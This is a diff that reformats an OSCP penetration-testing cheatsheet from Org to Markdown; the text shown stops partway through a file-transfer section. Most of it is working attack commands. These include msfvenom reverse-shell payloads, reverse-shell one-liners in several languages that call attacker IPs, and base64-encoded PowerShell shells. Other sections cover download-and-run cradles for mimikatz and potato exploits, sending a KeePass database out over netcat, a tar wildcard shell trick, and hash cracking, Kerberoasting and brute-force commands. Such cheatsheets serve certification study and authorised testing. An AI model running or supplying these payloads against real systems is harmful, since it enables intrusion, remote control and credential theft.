@@ -1,6 +1,6 @@
-#+TITLE: OSCP Cheatsheet
-#+AUTHOR: Forked by Ethan Lacerenza  Author: Leonardo Tamiano
-* Transfer file via Impacket tools:
+# OSCP Cheatsheet
+**Autore:** Forked by Ethan Lacerenza  Author: Leonardo Tamiano
+# Transfer file via Impacket tools:
 
 psexec and wmiexec are shipped with built in feature for file transfer.
 Note: By default whether you upload (lput) or download (lget) a file, it'll be writte in C:\Windows path.
@@ -11,14 +11,14 @@ C:\Windows\system32> lput mimikatz.exe
 C:\Windows\system32> cd C:\windows
 C:\Windows> dir /b mimikatz.exe
 mimikatz.exe
-  ```
+```
 Downloading mimikatz.log:
 ```
 
 C:\Windows> lget mimikatz.log
 [*] Downloading ADMIN$\mimikatz.log
-  ```
-* Transfer file via SMB 
+```
+# Transfer file via SMB
 
 Make a smb share 
 
@@ -35,163 +35,163 @@ then
 PS> cp filename.txt \\kali_ip\test\
 or
 CMD > copy filename.txt \\kali_ip\test\
- ```
+```
 
 if got error, try to make a share from your kali with username password
- ```
+```
 impacket-smbserver -smb2support test . -username df -password df
- ```
+```
 then from victim
- ```
+```
 net use \\kali_ip\test /u:df df
- ```
+```
 
 then
- ```
+```
 PS> cp filename.txt \\kali_ip\test\
 or
 CMD > copy filename.txt \\kali_ip\test\
-  ```
-* MSFVenom
+```
+# MSFVenom
   
 
 PHP reverse shell
-  ```
+```
 msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f raw -o shell.php
- ```
+```
 Java WAR reverse shell
-  ```
+```
 msfvenom -p java/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f war -o shell.war
- ```
+```
 Linux bind shell
-  ```
+```
 msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai
- ```
+```
 Linux FreeBSD reverse shell
-  ```
+```
 msfvenom -p bsd/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f elf -o shell.elf
- ```
+```
 Linux C reverse shell
-  ```
+```
 msfvenom  -p linux/x86/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f c
- ```
+```
 Windows non staged reverse shell
-  ```
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe
- ```
+```
 Windows Staged (Meterpreter) reverse shell
-  ```
+```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe
- ```
+```
 Windows Python reverse shell
-  ```
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f python -o shell.py
- ```
+```
 Windows ASP reverse shell
-  ```
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp
- ```
+```
 Windows ASPX reverse shell
-  ```
+```
 msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx
- ```
+```
 Windows JavaScript reverse shell with nops
-  ```
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f js_le -e generic/none -n 18
- ```
+```
 Windows Powershell reverse shell
-  ```
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1
- ```
+```
 Windows reverse shell excluding bad characters
-  ```
+```
 msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=10.10.10.10 LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai
- ```
+```
 Windows x64 bit reverse shell
-  ```
+```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -o shell.exe
- ```
+```
 Windows reverse shell embedded into plink
-  ```
+```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windows-binaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
-  ```
-* Reverse Shells
+```
+# Reverse Shells
   shell upgrade
-  ```
+```
 python3 -c 'import pty; pty.spawn("/bin/bash")'
-  ```
+```
 
   -----------------------
   
   bash
-  ```
+```
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 bash -c "bash -i >& /dev/tcp/192.168.45.183/443 0>&1"
-  ```
+```
 
   -----------------------
   
   perl
-  ```
+```
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-  ```
+```
 
   -----------------------
   
   python
-  ```
+```
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.218",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-  ```
+```
 
   -----------------------
   
   php
-  ```
+```
 <?php $sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
-  ```
+```
   
-  ```
+```
 php -r '$sock=fsockopen("192.168.45.218",80);exec("/bin/sh -i <&3 >&3 2>&3");'
-  ```
+```
 
   -----------------------
   
   ruby
-  ```
+```
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-  ```
+```
 
   -----------------------
   
   netcat
-  ```
+```
 nc -e /bin/sh 10.0.0.1 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.45.218 1234 >/tmp/f
-  ```
+```
 
   -----------------------
   
   malicious exe payload
-  ```
+```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=7777 -f exe -o auditTracker.exe
-  ```
+```
 
   listener endpoint
-  ```
+```
 msfconsole -x "use multi/handler;set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.45.235; set lport 7777; set ExitOnSession false; exploit -j"
-  ```
+```
 
   -----------------------
   
   powershell
-  ```
+```
 powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.235:1337/Invoke-PowerShellTcp.ps1\")" 
-  ```
+```
 
   ----
   
   create powershell one liner
-  ```
+```
 pwsh
 
 $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.119.3",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
@@ -201,7 +201,7 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
 $EncodedText
 
 powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOAAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
-  ```
+```
 
   After the oneline is created we can
 
@@ -209,7 +209,7 @@ powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5
 
   Generate base64 powershell reverse shell (remember to change IP and PORT)
 
-  ```python
+  #+begin_src python
 import sys
 import base64
 
@@ -218,237 +218,237 @@ payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.118.10",44
 cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()
 
 return cmd
- ```
+  #+end_src
 
   #+RESULTS:
   : powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMQAwACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=
   
-* Cracking
-** Hashcat helper
-   ```
+# Cracking
+## Hashcat helper
+```
 hashcat --help | grep -i "KeePass"
 
 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)
-   ```
-** ZIP 
+```
+## ZIP
    First it we extract the password hash and then crack it. 
    
-   ```
+```
 zip2john file.zip > zip.hash
 john --wordlist=rockyou.txt hash.txt
-   ```
+```
 
-** Bcrypt
+## Bcrypt
    This is hard to crack:  $2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1d...Pb9cqG
-   ```
+```
 hashcat -m 3200 -a 0 hash /usr/share/wordlists/rockyou.txt
 john  --wordlist=/usr/share/wordlists/rockyou.txt hash
-   ```
+```
 
-** KeePass
+## KeePass
    First it we extract the password hash 
    
-   ```
+```
 keepass2john Database.kdbx > keepass.hash -> remove database from hash 
-   ```
+```
 
    Then we crack it. We can either use *john*   
 
-   ```
+```
 john --wordlist=/home/leo/repos/projects/wordlists/passwords/rockyou.txt Keepasshash.txt
-   ```
+```
 
    or *hashcat*. If we hashcat we must remember to strip off the initial
    "Database:" from the hash.
 
-   ```
+```
 hashcat -m 13400 keepass.hash rockyou.txt -r rockyou-30000.rule --force
-   ```
+```
   
-** ssh key
+## ssh key
    First we extract the hash
    
-   ```
+```
 ssh2john id_rsa > ssh.hash
-   ```
+```
 
    Then we crack it, either with *john*
 
-   ```
+```
 john --wordlist=/usr/share/wordlists/passwords/rockyou.txt hash.txt
-   ```
+```
 
    or with *hashcat*
 
-   ```
+```
 hashcat -m 22921 ssh.hash rockyou.txt --force
-   ```
+```
    
-** NTLM
+## NTLM
    We can use *hashcat* with code 1000
 
-   ```
+```
 hashcat -m 1000 nelly.hash rockyou.txt -r best64.rule --force
-   ```
+```
    
-** Net-NTLMv2
+## Net-NTLMv2
    We can use *hashcat* with code 5600
 
-   ```
+```
 hashcat -m 5600 paul.hash rockyou.txt --force
-   ```
+```
    
-** AS-REP roasting
+## AS-REP roasting
    Suppose we perform a AS-REP attack over a windows AD
 
-   ```
+```
 impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
-   ```
+```
 
    Then we get the following hash
 
-   ```
+```
 $krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b01ec750cf35a2c37abde02f28b7aa363ffa1d18c9dd0262e43ab6a5447db24f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b147186042faaa686931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22
-   ```
+```
 
    to crack it we can use hashcat with code ~18200~
 
-   ```
+```
 sudo hashcat -m 18200 hashes.asreproast rockyou.txt -r best64.rule --force
-   ```
+```
    
-** Kerberoasting
+## Kerberoasting
    Suppose we perform a kerberoasting attack over a windows AD
 
-   ```
+```
 proxychains impacket-GetUserSPNs -request -dc-ip 10.10.132.146 oscp.exam/web_svc
-   ```
+```
 
    Then we get the following
 
-   ```
+```
 $krb5tgs$23$*iis_service$corp.com$HTTP/web04.corp.com:80@corp.com*$940AD9DCF5DD5CD8E91A86D4BA0396DB$F57066A4F4F8FF5D70DF39B0C98ED7948A5DB08D689B92446E600B49FD502DEA39A8ED3B0B766E5CD40410464263557BC0E4025BFB92D89BA5C12C26C72232905DEC4D060D3C8988945419AB4A7E7ADEC407D22BF6871D...
 ...
-   ```
+```
 
    to crack it we can use hashcat with code ~13100~
 
-   ```
+```
 sudo hashcat -m 13100 hashes.kerberoast rockyou.txt -r best64.rule --force
-   ```
+```
       
-* Tunneling
+# Tunneling
 
-** Ligolo-NG
+## Ligolo-NG
 Add interface and add network route
-   ```
+```
 sudo ip tuntap add user kali mode tun ligolo
 sudo ip link set ligolo up   
 sudo ip route add 10.10.200.0/24 dev ligolo 
-   ```
+```
 Start Ligolo.
-   ```
+```
 ./proxy -self-cert
 .\agent.exe -connect kali_ip:11601 -ignore-cert
-   ```
+```
   
-** socat
+## socat
 
-   ```
+```
 socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
-   ```
+```
    
-** ssh
+## ssh
    Four different types of tunnel:
 
    - *Local port forwarding:* Created with option -L
 
-     ```
+```
 ssh -N -L 0.0.0.0:4455:172.16.50.217:445 user@server
-     ```
+```
 
    - *Dynamic port forwarding*: Created with option -D
 
-     ```
+```
 ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
-     ```
+```
 
    - *Remote port forwarding*: Created with option -R
 
      First we start a local ssh server
 
-     ```
+```
 sudo systemctl start ssh
-     ```
+```
 
      Then we connect back to it from the remote machine. In this case,
      we want to listen on port 2345 on our Kali machine
      (127.0.0.1:2345), and forward all traffic to the PostgreSQL port
      on PGDATABASE01 (10.4.50.215:5432).
    
-     ```
+```
 ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
-     ```
+```
 
      We can then stop our ssh server
 
-     ```
+```
 sudo systemctl stop ssh
-     ```
+```
 
    - *Remote dynamic port forwarding*: Created with option -R but
      without specifying endpoints.
 
      First we start a local ssh server
 
-     ```
+```
 sudo systemctl start ssh
-     ```
+```
 
      Then we connect back to it from the remote machine. This creates
      a SOCKS5 proxy on our local machine at that port which is able to
      access all interfaces that are available to the victim machine.
 
-     ```
+```
 ssh -N -R 9998 kali@192.168.118.4
-     ```
+```
 
      We can then stop our ssh server
 
-     ```
+```
 sudo systemctl stop ssh
-     ```
+```
    
-** chisel
+## chisel
    First we download the executable on the remote machine
 
-   ```
+```
 certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
-   ```
+```
 
    then we start the executable on our linux attacker box
 
-   ```
+```
 ./chisel64.elf server -p 8000 --reverse
-   ```
+```
 
    and then we connect to it from the remote machine using our IP
    during the connection.
 
-   ```
+```
 chisel64.exe client 192.168.45.217:8000 R:socks
-   ```
+```
 
    This, by default, will create a SOCKS5 proxy within the endpoint
    127.0.0.1:1080 of our local machine. To access that proxy we can
    edit the proxychains conf in order to put at the end
 
-   ```
+```
 socks5 127.0.0.1:1080
-   ```
+```
   Chisel Port forwarding 
 
-   ```
+```
 ./chisel server --reverse --port 51234 -> On Kali
 chisel client attack-box-ip:51234 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443 -> On remote server 
                                                ^                     ^    
@@ -456,122 +456,122 @@ chisel client attack-box-ip:51234 R:8001:127.0.0.1:8001 R:8443:127.0.01:8443 -> 
                                                |
                                                |___ attack-ip:attack-port:target-ip:target-port
  
-   ```
-* Enumeration
+```
+# Enumeration
   
-** General
+## General
    Nmap port scanning
-   ```
+```
 nmap -sV  -p- -sT -A -T4  192.168.127.10  - > complete scan
 nmap -sC -sV <IP>
 nmap -p- <IP>
 sudo nmap -sU -p161 <IP>
 proxychains nmap -sT --top-ports=100 -Pn <IP>
-   ```
+```
 
    Port scanning in windows
-   ```
+```
 Test-NetConnection -Port 445 192.168.50.151
 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
-   ```
+```
 
    Search for exploits and copy them
-   ```
+```
 searchsploit <SOFTWARE>
 searchsploit -m 16051
-   ```
+```
    
    DNS zone transfer attack
-   ```
+```
 dig axfr oscp.exam @192.168.221.156
-   ```
+```
    
    Login with RDP
-   ```
+```
 xfreerdp /u:yoshi /p:"Mushroom!" /v:172.16.219.82
-   ```
+```
 
   KeePass database
-  ```
+```
 kpcli --kdb=Database.kdbx
 kpcli:/Database/Network> show -f 0
-  ```   
+```
 
   Extract data from pdf
-  ```
+```
 exiftool -a file.pdf 
-  ```
+```
   
-** Brute Forcing
+## Brute Forcing
    Brute forcing RDP with hydra
-   ```
+```
 hydra -l user -P rockyou.txt rdp://192.168.50.202
-   ```
+```
 
    Brute forcing FTP with hydra
-   ```
+```
 hydra -l itadmin -I -P rockyou.txt -s 21 ftp://192.168.247.202
-   ```
+```
 
    Brute forcing SSH with hydra
-   ```
+```
 hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201
-   ```
+```
 
    Brute forcing HTTP POST login with hydra
-   ```
+```
 hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
-   ```
+```
 
    Password spraying RDP with hydra
-   ```
+```
 hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.247.202
-   ```
+```
    
-** HTTP
+## HTTP
 
    gobuster directory mode
-   ```
+```
 gobuster dir -t20 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.216.121 -x aspx
-   ```
+```
 
    gobuster vhost mode
-   ```
+```
 gobuster vhost --wordlist /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://oscp.exam:8000 --exclude-length 334
-   ```
+```
 
    ---------------------
   ffuf
-   ```
+```
 ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://192.168.0.172/FUZZ -t 100
-   ```
+```
    wfuzz
-   ```
+```
 wfuzz -w /home/kali/repos/projects/SecLists/Discovery/DNS/subdomains-top1million-110000.txt http://192.168.238.150:8080/search?FUZZ=FUZZ
 
-   ```
+```
 
    ---------------------
 
    kiterunner to enumerate API endpoints
 
-   ```
+```
 kiterunner scan http://192.168.243.143/api/ -w routes-small.kite -x 20
-   ```
+```
 
    ---------------------
    
    php filters with LFI
-   ```
+```
 curl http://192.168.193.16/meteor/index.php?page=php://filter/convert.base64-encode/resource=../../../../../../..//var/www/html/backup.php
 curl http://192.168.193.16/meteor/index.php?page=data://text/plain,<?php%20echo%20system('uname%20-a');?>"
-   ```
+```
 
    ---------------------
 
    enumerate wordpress sites
 
-   ```
+```
 # default enumeration
 wpscan --url http://10.10.10.88/webservices/wp
 
@@ -586,251 +586,251 @@ wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 
 
 # enumerate everything
 wpscan --url http://10.10.10.88/webservices/wp/index.php --proxy 127.0.0.1:8080 --enumerate ap tt at
-   ```
+```
    
-** SMB
+## SMB
 
    nmap to get basic info
-   ```
+```
 nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
-   ```
+```
 
    check for anonymous share
-   ```
+```
 smbmap -H <IP>
-   ```
+```
 
    Connect to SMB share
-   ```
+```
 smbclient //172.16.246.11/C$ -U medtech.com/joe%Password
 smbclient //192.168.212.248/transfer -U damon --pw-nt-hash 820d6348590813116884101357197052 -W relia.com
-   ```
+```
 
    download recursively entire share
-   ```
+```
 smbget -a -R smb://active/Replication
-   ```   
+```
    
    list share of particular user with username and password
-   ```
+```
 crackmapexec smb 192.168.242.147 -u web_svc -p Dade --shares
-   ```
+```
 
    list share of particular user with NTLM hash
-   ```
+```
 crackmapexec smb 192.168.242.147 -u web_svc -H 822d2348890853116880101357194052
-   ```
+```
 
    password spraying
-   ```
+```
 crackmapexec smb 192.168.242.147 -u usernames.txt -p Diamond1 --shares
-   ```
+```
 
    crawl all files
-   ```
+```
 crackmapexec smb active -u "" -p "" -M spider_plus
-   ```
+```
    
-** SNMP
+## SNMP
    
    Download necessary stuff to deal with SNMP extended objects
-   ```
+```
 sudo apt-get install snmp-mibs-downloader
 download-mibs
 sudo nano /etc/snmp/snmp.conf (comment line saying "mibs :")
-   ```
+```
 
    Enumerate all available communities, the wordlist can be downloaded from SecLists
-   ```
+```
 onesixtyone -c common-snmp-community-strings-onesixtyone.txt 192.168.238.149 -w 100
-   ```
+```
 
    Simple walk
-   ```
+```
 snmpbulkwalk -c public -v2c 192.168.238.149 > out.txt
-   ```
+```
 
    Enumerate extended objects
-   ```
+```
 snmpwalk -v1 -c public 192.168.221.156  NET-SNMP-EXTEND-MIB::nsExtendObjects
-   ```
+```
    
-** Linux
+## Linux
    linenum
-   ```
+```
 curl http://192.168.45.198/linenum.sh > linenum.sh
 chmod +x linenum.sh
 ./linenum.sh | tee linenum_output.txt
-   ```
+```
 
    linpeas
-   ```
+```
 curl http://192.168.45.198/linpeas.sh > linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh | tee linpeas.txt
-   ```
+```
    
    pspy64 to view cronjobs
-   ```
+```
 curl http://192.168.45.198/pspy64 > pspy64
 chmod +x pspy64
 ./pspy64
-   ```
+```
 
    Permission of Current user
-   ```
+```
 sudo -l
-   ```
+```
 
    SUID files
-   ```
+```
 find / -perm -u=s  2>/dev/null
-   ```
+```
 
    SGID files
-   ```
+```
 find / -perm -g=s -type f 2>/dev/null
-   ```
+```
 
    search particular filename
-   ```
+```
 find / -name "*GENERIC*" -ls
-   ```
+```
 
    print env variables
-   ```
+```
 env
-   ```
+```
 Wildcard abuse
- ```
+```
 echo "mkfifo /tmp/lhennp; nc 192.168.1.102 8888 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
 tar cf archive.tar *
 ```
-** Windows
-*** Basic enumeration
+## Windows
+### Basic enumeration
     operating system, version and architecture
-    ```
+```
 systeminfo
-    ```
+```
 
     launch powershell 
-    ```
+```
 powershell -ep bypass
-    ```
+```
    
     list my user
-    ```
+```
 whoami
-    ```
+```
    
     list my priv
-    ```
+```
 whoami /priv
-    ```
+```
 
     list my groups
-    ```
+```
 whoami /groups
-    ```
+```
    
     list users
-    ```
+```
 net user
-    ```   
+```
 
     list my users details
-    ```
+```
 net user <MY-NAME>
-    ```
+```
 
     list account policy
-    ```
+```
 net accounts
-    ```
+```
    
     existing groups
-    ```
+```
 Get-LocalUser
 Get-LocalGroup
 Get-LocalGroupMember <GROUP-NAME>
-    ```
+```
    
     network information
-    ```
+```
 ipconfig /all
 route print
 netstat -ano
-    ```
+```
 
     get env variables
-    ```
+```
 dir env:
-    ```
+```
 
     installed apps (32 bit)
-    ```
+```
 Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-    ```
+```
 
     installed apps (64 bit)
-    ```
+```
 Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
-    ```
+```
    
     running processes
-    ```
+```
 Get-Process
-    ```
+```
    
-*** Files, services and History 
+### Files, services and History
     search files recursively
-    ```
+```
 Get-ChildItem -Path C:\Users\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-    ```
+```
 
     get permissions
-    ```
+```
 icacls auditTracker.exe
-    ```
+```
 
     get service info
-    ```
+```
 Get-Service * | Select-Object Displayname,Status,ServiceName,Can*
 Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
-    ```
+```
 
     Search history
-    ```
+```
 (Get-PSReadlineOption).HistorySavePath
 type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 type C:\Users\Public\Transcripts\transcript01.txt
-    ```
+```
 
     ---------------------
     
     Connect to MSSQL database
-    ```
+```
 impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
-    ```  
+```
 
-*** File transfer
-    ```
+### File transfer
+```
 certutil -urlcache -split -f "http://192.168.45.170:1337/chisel64.exe" chisel64.exe
-    ```
+```
 
-    ```
+```
 iwr -uri http://192.168.45.159:1337/winPEASx64.exe -Outfile winPEASx64.exe
-    ```
+```
    
     Transfer files from window using nc
-    ```
+```
 Get-Content "Database.kdbx" | .\nc.exe 192.168.45.239 5555
-    ```
+```
 
     Typical files to transfer
-    ```
+```
 iwr -uri http://192.168.45.159:1337/ncat.exe -Outfile ncat.exe
 iwr -uri http://192.168.45.159:1337/mimikatz64.exe -Outfile mimikatz64.exe
 iwr -uri http://192.168.45.159:1337/chisel64.exe -Outfile chisel64.exe
@@ -845,20 +845,20 @@ iwr -uri http://192.168.45.159:1337/GodPotato-NET2.exe -Outfile GodPotato-NET2.e
 iwr -uri http://192.168.45.159:1337/GodPotato-NET4.exe -Outfile GodPotato-NET4.exe
 iwr -uri http://192.168.45.159:1337/GodPotato-NET35.exe -Outfile GodPotato-NET35.exe
 iwr -uri http://192.168.45.159:1337/JuicyPotatoNG.exe -Outfile JuicyPotatoNG.exe
-    ```
+```
 
     Other types of file transfer
-    ```
+```
 (new-object System.Net.WebClient).DownloadFile("http://10.10.122.141/Script/mimikatz64.exe", "C:\TEMP\mimikatz64.exe")
-    ```
+```
 
     Start SMB server
-    ```
+```
